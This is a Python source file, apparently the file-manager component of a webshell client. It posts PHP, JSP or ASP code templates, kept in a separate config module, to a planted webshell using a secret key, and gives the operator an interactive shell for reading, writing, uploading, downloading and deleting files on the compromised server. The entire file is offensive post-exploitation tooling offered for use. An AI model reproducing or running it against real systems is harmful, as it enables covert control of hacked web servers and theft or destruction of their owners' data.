import config.fileConfig as fileC
import requests as res
import random
class fileManager:
    def __init__(self,con):
        self.con = con

    def Begin(self):
        #connect = 'http://127.0.0.1:8080/index.php'
        self.connect = self.con.getUrl()
        self.key = self.con.getKey()
        #connect = connect + self.getBaseCode()
        #print(connect)
        date = { self.key : self.getBaseCode() }
        re = res.session()
        firstURL=re.post(self.connect,date)
        #print(firstURL.text)
        print(firstURL.text)
        self.FileMain(re)
        re.close()



    def getBaseCode(self):
        if self.con.getTyp()=="php":
            baseCodeForFile=fileC.PHP_fileBaseCode   
        if self.con.getTyp()=="jsp":
            baseCodeForFile=fileC.JSP_fileBaseCode
        if self.con.getTyp()=="asp":
            baseCodeForFile=fileC.ASP_fileBaseCode
        #print(baseCodeForFile)
        return baseCodeForFile

    def check(self,text):
        if len(text)<2:
            print('缺少参数')
        return len(text)

    def path(self,re):
        if self.con.getTyp()=="php":
            getpath = fileC.PHP_GETPATH
        if self.con.getTyp()=="jsp":
            getpath = fileC.JSP_GETPATH
        if self.con.getTyp()=="asp":
            getpath = fileC.ASP_GETPATH
        getpath = getpath.replace('@@',self.changePath(),1)
        date = { self.key : getpath }
        commit = re.post(self.connect,date)
        # print(commit.text)
        return commit.text

    def changePath(self):
        j = 0
        str = self.CHANGE_PATH[0]
        while j!=self.i:
            j = j + 1
            str = str + '/' + self.CHANGE_PATH[j]
        if self.con.getTyp()=="php":
            changePach_ = fileC.PHP_CHDIR.replace('##',str,1)
        if self.con.getTyp()=="jsp":
            changePach_ = fileC.PHP_CHDIR.replace('##',str,1)
        if self.con.getTyp()=="asp":
            changePach_ = fileC.PHP_CHDIR.replace('##',str,1)
        return changePach_

    def FileMain(self,re):
        self.i = 0
        self.CHANGE_PATH = dict.fromkeys(range(1024),'.')
        while True:
            self.PATH = self.path(re)+" >"
            # print(PATH)
            flag = input(self.PATH).split()
            if len(flag) == 0:
                continue
            if flag[0] == 'exit':
                print('exit')
                flag == ''
                break

            if flag[0] == 'cd':
                if self.check(flag)>1:
                    if flag[1] != '.' and flag[1] != '..':
                        self.i = self.i + 1
                        self.CHANGE_PATH[self.i] = flag[1]
                        if self.con.getTyp()=="php":
                            CD = fileC.PHP_CD.replace('@@',self.changePath(),1)
                        if self.con.getTyp()=="jsp":
                            CD = fileC.JSP_CD.replace('@@',self.changePath(),1)
                        if self.con.getTyp()=="asp":
                            CD = fileC.ASP_CD.replace('@@',self.changePath(),1)
                        date = { self.key : CD }
                        commit = re.post(self.connect,date)
                        # print(commit.text)
                    elif flag[1] != '.':
                        self.i = self.i - 1
                    continue
                else:
                    continue

            if flag[0] == 'read':
                if self.check(flag)>1:
                    if self.con.getTyp()=="php":
                        READ_r = fileC.PHP_READ.replace('##',flag[1],1)
                    if self.con.getTyp()=="jsp":
                        READ_r = fileC.JSP_READ.replace('##',flag[1],1)
                    if self.con.getTyp()=="asp":
                        READ_r = fileC.ASP_READ.replace('##',flag[1],1)
                    READ_r = READ_r.replace('@@',self.changePath(),1)
                    # print(READ_r)
                    date = { self.key : READ_r }
                    #date = { self.key : fileC.PHP_test }
                    commit = re.post(self.connect,date)
                    print(commit.text,"\n")
                    continue
                else:
                    continue

            if flag[0] == 'delete' or flag[0] == 'rm':
                if self.check(flag)>1:
                    if self.con.getTyp()=="php":
                        delete = fileC.PHP_DELETE.replace('##',flag[1],1)
                    if self.con.getTyp()=="jsp":
                        delete = fileC.JSP_DELETE.replace('##',flag[1],1)
                    if self.con.getTyp()=="asp":
                        delete = fileC.ASP_DELETE.replace('##',flag[1],1)
                    delete = delete.replace('@@',self.changePath(),1)
                    # print(READ_r)
                    date = { self.key : delete }
                    #date = { self.key : fileC.PHP_test }
                    commit = re.post(self.connect,date)
                    print(commit.text,"\n")
                    continue
                else:
                    continue

            if flag[0] == 'mkdir':
                if self.check(flag)>1:
                    if self.con.getTyp()=="php":
                        mkdir = fileC.PHP_MKDIR.replace('##',flag[1],1)
                    if self.con.getTyp()=="jsp":
                        mkdir = fileC.JSP_MKDIR.replace('##',flag[1],1)
                    if self.con.getTyp()=="asp":
                        mkdir = fileC.ASP_MKDIR.replace('##',flag[1],1)
                    mkdir = mkdir.replace('@@',self.changePath(),1)
                    # print(READ_r)
                    date = { self.key : mkdir }
                    #date = { self.key : fileC.PHP_test }
                    commit = re.post(self.connect,date)
                    print(commit.text,"\n")
                    continue
                else:
                    continue

            if flag[0] == 'rmdir':
                if self.check(flag)>1:
                    if self.con.getTyp()=="php":
                        rmdir = fileC.PHP_RMDIR.replace('##',flag[1],1)
                    if self.con.getTyp()=="jsp":
                        rmdir = fileC.JSP_RMDIR.replace('##',flag[1],1)
                    if self.con.getTyp()=="asp":
                        rmdir = fileC.ASP_RMDIR.replace('##',flag[1],1)
                    rmdir = rmdir.replace('@@',self.changePath(),1)
                    # print(READ_r)
                    date = { self.key : rmdir }
                    #date = { self.key : fileC.PHP_test }
                    commit = re.post(self.connect,date)
                    print(commit.text,"\n")
                    continue
                else:
                    continue

            if flag[0] == 'mkfile':
                if self.check(flag)>1:
                    if self.con.getTyp()=="php":
                        mkfile = fileC.PHP_MKFILE.replace('##',flag[1],1)
                    if self.con.getTyp()=="jsp":
                        mkfile = fileC.JSP_MKFILE.replace('##',flag[1],1)
                    if self.con.getTyp()=="asp":
                        mkfile = fileC.ASP_MKFILE.replace('##',flag[1],1)
                    mkfile = mkfile.replace('@@',self.changePath(),1)
                    # print(READ_r)
                    date = { self.key : mkfile }
                    #date = { self.key : fileC.PHP_test }
                    commit = re.post(self.connect,date)
                    print(commit.text,"\n")
                    continue
                else:
                    continue

            if flag[0] == 'ls' or flag[0] == 'dir':
                if self.con.getTyp()=="php":
                    dir = fileC.PHP_GETDIR
                if self.con.getTyp()=="jsp":
                    dir = fileC.JSP_GETDIR
                if self.con.getTyp()=="asp":
                    dir = fileC.ASP_GETDIR
                dir = dir.replace('@@',self.changePath(),1)
                date = { self.key : dir }
                commit = re.post(self.connect,date)
                print(commit.text,"\n")
                continue

            if flag[0] == 'pwd' or flag[0] == 'cwd':
                if self.con.getTyp()=="php":
                    pwd = fileC.PHP_GETPATH
                if self.con.getTyp()=="jsp":
                    pwd = fileC.JSP_GETPATH
                if self.con.getTyp()=="asp":
                    pwd = fileC.ASP_GETPATH
                pwd = pwd.replace('@@',self.changePath(),1)
                date = { self.key : pwd }
                commit = re.post(self.connect,date)
                print(commit.text,"\n")
                continue

            if flag[0] == 'rename':
                if self.check(flag)>2:
                    if self.con.getTyp()=="php":
                        rename = fileC.PHP_RENAME.replace('#1',flag[1],1)
                    if self.con.getTyp()=="jsp":
                        rename = fileC.JSP_RENAME.replace('#1',flag[1],1)
                    if self.con.getTyp()=="asp":
                        rename = fileC.ASP_RENAME.replace('#1',flag[1],1)
                    rename = rename.replace("#2",flag[2])
                    rename = rename.replace('@@',self.changePath(),1)
                    date = { self.key : rename }
                    commit = re.post(self.connect,date)
                    print(commit.text,"\n")
                    continue
                else:
                    continue

            if flag[0] == 'copy':
                if self.check(flag)>2:
                    if self.con.getTyp()=="php":
                        copy = fileC.PHP_COPY.replace('#1',flag[1],1)
                    if self.con.getTyp()=="jsp":
                        copy = fileC.JSP_COPY.replace('#1',flag[1],1)
                    if self.con.getTyp()=="asp":
                        copy = fileC.ASP_COPY.replace('#1',flag[1],1)
                    copy = copy.replace("#2",flag[2])
                    copy = copy.replace('@@',self.changePath(),1)
                    date = { self.key : copy }
                    commit = re.post(self.connect,date)
                    print(commit.text,"\n")
                    continue
                else:
                    continue

            if flag[0] == 'write':
                if self.check(flag)>2:
                    if self.con.getTyp()=="php":
                        write = fileC.PHP_WRITE.replace('#1',flag[1],1)
                    if self.con.getTyp()=="jsp":
                        write = fileC.JSP_WRITE.replace('#1',flag[1],1)
                    if self.con.getTyp()=="asp":
                        write = fileC.ASP_WRITE.replace('#1',flag[1],1)
                    write = write.replace("#2",flag[2],1)
                    write = write.replace('@@',self.changePath(),1)
                    date = { self.key : write }
                    commit = re.post(self.connect,date)
                    print(commit.text,"\n")
                    continue
                else:
                    continue

            if flag[0] == 'upload':
                if self.check(flag)>2:
                    if self.con.getTyp()=="php":
                        update = fileC.PHP_UPLOAD.replace('#1',flag[1],1)
                    if self.con.getTyp()=="jsp":
                        update = fileC.JSP_UPLOAD.replace('#1',flag[1],1)
                    if self.con.getTyp()=="asp":
                        update = fileC.ASP_UPLOAD.replace('#1',flag[1],1)
                    #将本地路径所指文件读出到strofupdate
                    file1 = open(flag[2])
                    strofupdate = file1.read()
                    update = update.replace('#2',strofupdate,1)
                    update = update.replace('@@',self.changePath(),1)
                    date = { self.key : update }
                    commit = re.post(self.connect,date)
                    print(commit.text,"\n")
                    file1.close()
                    continue
                else:
                    continue

            if flag[0] == 'download':
                if self.check(flag)>1:
                    if self.con.getTyp()=="php":
                        download = fileC.PHP_READ.replace('@@',self.changePath(),1)
                    if self.con.getTyp()=="jsp":
                        download = fileC.JSP_READ.replace('@@',self.changePath(),1)
                    if self.con.getTyp()=="asp":
                        download = fileC.ASP_READ.replace('@@',self.changePath(),1)
                    download = download.replace('##',flag[1],1)
                    date = { self.key : download }
                    commit = re.post(self.connect,date)
                    #filedown = '/download/'
                    filedown =str(random.randint(100000,999999)) + '_' + flag[1]
                    #print(filedown)
                    file2 = open(filedown ,'w')
                    file2.write(commit.text)
                    print('done')
                    file2.close()
                    continue
                else:
                    continue


            if flag[0] == 'writeto':
                if self.check(flag)>2:
                    if self.con.getTyp()=="php":
                        writeto = fileC.PHP_WRITETO.replace('#1',flag[1],1)
                    if self.con.getTyp()=="jsp":
                        writeto = fileC.JSP_WRITETO.replace('#1',flag[1],1)
                    if self.con.getTyp()=="asp":
                        writeto = fileC.ASP_WRITETO.replace('#1',flag[1],1)
                    num = len(flag)
                    str1 = flag[2]
                    n = 3
                    while  n != num:
                        str1 = str1 + ' ' + flag[n]
                        n = n + 1
                    print(str1)
                    writeto = writeto.replace("#2",str1)
                    writeto = writeto.replace('@@',self.changePath(),1)
                    date = { self.key : writeto }
                    commit = re.post(self.connect,date)
                    print(commit.text,"\n")
                    continue
                else:
                    continue

            print('指令错误 !')
